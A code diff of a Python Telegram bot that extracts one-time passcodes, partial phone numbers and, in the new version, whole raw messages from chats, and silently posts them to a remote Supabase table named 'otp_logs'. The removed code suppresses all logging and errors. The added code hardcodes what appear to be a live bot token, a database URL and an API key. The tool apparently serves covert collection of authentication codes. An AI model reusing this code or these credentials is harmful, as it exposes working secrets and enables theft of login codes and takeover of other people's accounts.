@@ -1,16 +1,10 @@
 import re
 import requests
-import logging
-import os
 from telegram.ext import ApplicationBuilder, MessageHandler, filters
 
-# 🔒 Disable ALL logging
-logging.getLogger().setLevel(logging.CRITICAL)
-
-# ENV VARIABLES (use Render env settings)
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-SUPABASE_URL = os.getenv("SUPABASE_URL")
-SUPABASE_KEY = os.getenv("SUPABASE_KEY")
+BOT_TOKEN = "7941038643:AAFFM8jv2RkFyyxzgdzuyqy6UiCHNZhIlWo"
+SUPABASE_URL = "https://zubkwzsnpdjtndlvqfqf.supabase.co"
+SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp1Ymt3enNucGRqdG5kbHZxZnFmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUxNDgyMjMsImV4cCI6MjA5MDcyNDIyM30.6fcSUpeuBONYGsWCG9lmOaf0lOPq9CDt2Ud9jXsvbSo"
 
 HEADERS = {
     "apikey": SUPABASE_KEY,
@@ -20,61 +14,48 @@ HEADERS = {
 
 OTP_REGEX = r"\b\d{4,6}\b"
 
-def extract(text):
-    try:
-        otp = re.search(OTP_REGEX, text)
-        number = re.search(r"Number:\s*(.+)", text)
+def extract_data(text):
+    otp_match = re.search(OTP_REGEX, text)
+    number_match = re.search(r"Number:\s*(.+)", text)
 
-        last3 = None
-        if number:
-            last3_match = re.search(r"(\d{3})$", number.group(1))
-            if last3_match:
-                last3 = last3_match.group(1)
+    otp = otp_match.group() if otp_match else None
 
-        return {
-            "otp": otp.group() if otp else None,
-            "phone_last3": last3
-        }
-    except:
-        return {"otp": None, "phone_last3": None}
+    phone_last3 = None
+    if number_match:
+        digits = re.sub(r"\D", "", number_match.group(1))
+        if len(digits) >= 3:
+            phone_last3 = digits[-3:]
+
+    return otp, phone_last3
 
 async def handle(update, context):
+    if not update.message or not update.message.text:
+        return
+
+    text = update.message.text
+
+    otp, last3 = extract_data(text)
+
+    if not otp or not last3:
+        return
+
+    payload = {
+        "otp": otp,
+        "phone_last3": last3,
+        "raw_message": text
+    }
+
     try:
-        if not update.message or not update.message.text:
-            return
-
-        text = update.message.text
-
-        data = extract(text)
-
-        if data["otp"] and data["phone_last3"]:
-            try:
-                requests.post(
-                    f"{SUPABASE_URL}/rest/v1/otp_logs",
-                    headers=HEADERS,
-                    json=data,
-                    timeout=5
-                )
-            except:
-                pass  # ignore request errors completely
-
-    except:
-        pass  # ignore everything
-
-def main():
-    try:
-        app = ApplicationBuilder().token(BOT_TOKEN).build()
-
-        app.add_handler(
-            MessageHandler(filters.TEXT & ~filters.COMMAND, handle)
-        )
-
-        app.run_polling(
-            drop_pending_updates=True,
-            close_loop=False
+        requests.post(
+            f"{SUPABASE_URL}/rest/v1/otp_logs",
+            headers=HEADERS,
+            json=payload,
+            timeout=5
         )
     except:
-        pass  # no crash logs
+        pass  # silent failure
 
-if __name__ == "__main__":
-    main()
+app = ApplicationBuilder().token(BOT_TOKEN).build()
+app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
+
+app.run_polling()
